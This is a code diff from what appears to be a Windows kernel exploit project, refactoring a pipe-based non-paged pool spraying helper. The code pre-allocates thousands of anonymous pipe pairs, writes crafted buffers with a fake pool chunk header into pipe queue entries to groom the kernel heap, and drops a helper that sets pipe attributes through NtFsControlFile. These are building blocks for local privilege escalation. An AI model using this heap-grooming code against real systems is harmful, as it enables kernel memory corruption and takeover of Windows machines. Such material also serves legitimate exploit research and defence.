@@ -2,41 +2,15 @@
 #include <windows.h>
 #include <winternl.h>
 #include <cstdint>
-#include <map>
 #include <vector>
 
 #include "pipe_utils/pipe_utils.h"
 #include "windows_api/windows_api.h"
 
-std::map<size_t, std::vector<pipe_pair_t>> g_pipe_pool;
+std::vector<pipe_pair_t> g_pipe_pool;
 const size_t POOL_INCREMENT = 0x1000;
 
-int SetPipeAttribute(pipe_pair_t* target_pipe, const char* data, size_t size)
-{
-    if (!target_pipe || !data)
-        return 0;
-
-    IO_STATUS_BLOCK status;
-    char output[0x100];
-
-    memset(output, 0x42, sizeof(output));
-
-    NTSTATUS result = NtFsControlFile_(
-        target_pipe->write,
-        NULL,
-        NULL,
-        NULL,
-        &status,
-        0x11003C,
-        (PVOID)data,
-        size,
-        output,
-        sizeof(output));
-
-    return NT_SUCCESS(result);
-}
-
-int writeDataToPipe(const pipe_pair_t* pipe_pair, const char* data, size_t bufsize)
+int WriteDataToPipe(const pipe_pair_t* pipe_pair, const char* data, size_t bufsize)
 {
     if (!pipe_pair || !data)
         return 0;
@@ -82,12 +56,12 @@ int readDataFromPipe(const pipe_pair_t* pipe_pair, char* out, size_t bufsize)
         NULL);
 }
 
-int createPipePair(size_t block_size, pipe_pair_t* pipe_pair)
+int createPipePair(pipe_pair_t* pipe_pair)
 {
     if (!pipe_pair)
         return 0;
 
-    if (!CreatePipe(&pipe_pair->read, &pipe_pair->write, NULL, PIPE_QUEUE_ENTRY_BUFSIZE(block_size)))
+    if (!CreatePipe(&pipe_pair->read, &pipe_pair->write, NULL, 0xFFFFFFFF))
     {
         fprintf(stderr, "[-] Failed to create pipe pair: %lu\n", GetLastError());
         return 0;
@@ -95,47 +69,47 @@ int createPipePair(size_t block_size, pipe_pair_t* pipe_pair)
     return 1;
 }
 
-int replenishPool(size_t block_size)
+int replenishPool()
 {
-    size_t initial_size = g_pipe_pool[block_size].size();
-    g_pipe_pool[block_size].resize(initial_size + POOL_INCREMENT);
+    size_t initial_size = g_pipe_pool.size();
+    g_pipe_pool.resize(initial_size + POOL_INCREMENT);
 
-    for (size_t i = initial_size; i < g_pipe_pool[block_size].size(); i++)
+    for (size_t i = initial_size; i < g_pipe_pool.size(); i++)
     {
-        createPipePair(block_size, &g_pipe_pool[block_size][i]);
+        createPipePair(&g_pipe_pool[i]);
     }
     return 1;
 }
 
 pipe_pair_t AllocNPPNxChunk(const vs_chunk_t* chunk, size_t block_size)
 {
+    // Check if we need to replenish the pool for this block size
+    if (g_pipe_pool.empty())
+    {
+        replenishPool();
+    }
+
+    // Get a pipe from the pool
+    pipe_pair_t pipe = g_pipe_pool.back();
+    g_pipe_pool.pop_back();
+
     // Check if block_size is too large
-    if (block_size > 0x1000)
+    const size_t temp_buf_size = 0x1000;
+    size_t bufsize = PIPE_QUEUE_ENTRY_BUFSIZE(block_size);
+    if (bufsize > temp_buf_size)
     {
         fprintf(stderr, "[-] Block size exceeds 0x1000 bytes limit\n");
         return { 0 };
     }
 
-    // Check if we need to replenish the pool for this block size
-    if (g_pipe_pool[block_size].empty())
-    {
-        replenishPool(block_size);
-    }
-
-    // Get a pipe from the pool
-    pipe_pair_t pipe = g_pipe_pool[block_size].back();
-    g_pipe_pool[block_size].pop_back();
-
-    size_t bufsize = PIPE_QUEUE_ENTRY_BUFSIZE(block_size);
-
-    char buffer[0x1000];
+    char buffer[temp_buf_size];
     memset(buffer, 0x41, bufsize);
     if (chunk)
     {
         memcpy(buffer, chunk, MIN(bufsize, sizeof(vs_chunk_t)));
     }
 
-    writeDataToPipe(&pipe, buffer, bufsize);
+    WriteDataToPipe(&pipe, buffer, bufsize);
 
     return pipe;
 }
@@ -179,7 +153,7 @@ int FreeNPPNxChunk(pipe_pair_t pipe, size_t block_size)
         return 0;
     }
 
-    g_pipe_pool[block_size].push_back(pipe);
+    g_pipe_pool.push_back(pipe);
     return 1;
 }
 
